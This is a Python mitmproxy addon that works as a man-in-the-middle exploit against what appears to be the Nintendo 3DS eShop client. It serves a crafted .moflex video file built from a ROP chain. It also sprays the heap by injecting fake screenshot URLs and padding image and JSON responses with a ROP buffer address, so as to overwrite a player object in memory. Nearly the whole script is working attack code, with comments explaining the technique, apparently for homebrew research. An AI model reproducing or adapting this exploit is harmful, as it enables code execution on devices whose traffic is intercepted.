from mitmproxy import ctx
from mitmproxy import http
from mitmproxy import log
from mitmproxy import command

import random
import json
import os
import time

from struct import pack
from rop import *

content, ropBufferAddr = makeMoflexBin()

def request(flow : http.HTTPFlow) -> None:
    if ".moflex" in flow.request.url:
        #send the moflex file to trigger the exploit
        flow.response = http.HTTPResponse.make(
            200,
            bytes(content),
            {'Server': 'nginx', 'Content-Type': 'application/octet-stream', 'Accept-Ranges': 'bytes', 'Last-Modified': 'Wed, 09 Sep 2015 00:29:42 GMT', 'Date': 'Sat, 30 May 2020 22:58:49 GMT', 'Content-Range': 'bytes 0-3884159/3884160', 'Content-Length': '3884160', 'Connection': 'keep-alive'}
        )
        content_len = flow.response.headers["Content-Length"]
        flow.response.headers["Content-Range"] = "bytes 0-"+content_len+"/"+content_len
    elif "spray" in flow.request.url and ".jpg" in flow.request.url:
        #"spraying" the heap
        flow.response = http.HTTPResponse.make(
            200,
            pack("<I", ropBufferAddr)*(0x2B8//4),
            {'Server': 'nginx', 'Content-Type': 'image/jpeg;charset=UTF-8', 'Content-Length': '15370', 'Accept-Ranges': 'bytes', 'Last-Modified': 'Tue, 08 Sep 2015 22:28:06 GMT', 'Cache-Control': 'max-age=59321', 'Expires': 'Mon, 01 Jun 2020 04:14:48 GMT', 'Date': 'Sun, 31 May 2020 11:46:07 GMT', 'Connection': 'keep-alive'}
        )




def response(flow : http.HTTPFlow) -> None:
    if "samurai" in flow.request.url and "/title/" in flow.request.url:
        #add dummy screenshots to the title info page, those images are then replaced
        #by buffers full of ropBufferAddr to try "spraying" the heap and write the content
        #over the future Player object buffer
        resp_json = json.loads(flow.response.text)
        screenshot = []
        for i in range(3):
            upper = {"type": "upper", "value": "https://"+flow.request.host+"/i/spray_upper"+str(i)+".jpg"}
            lower = {"type": "lower", "value": "https://"+flow.request.host+"/i/spray_lower"+str(i)+".jpg"}
            image_url = {"image_url": [upper, lower]}
            screenshot.append(image_url)
        resp_json["title"]["screenshots"]["screenshot"] = screenshot
        flow.response.text = json.dumps(resp_json)
    elif "_type=json" in flow.request.url:
        #spraying -> fill heap with ropBufferAddr, increase probability of success if it gets allocated over the future Player object buffer
        flow.response.content += pack("<I", ropBufferAddr)*(0x1000//4)
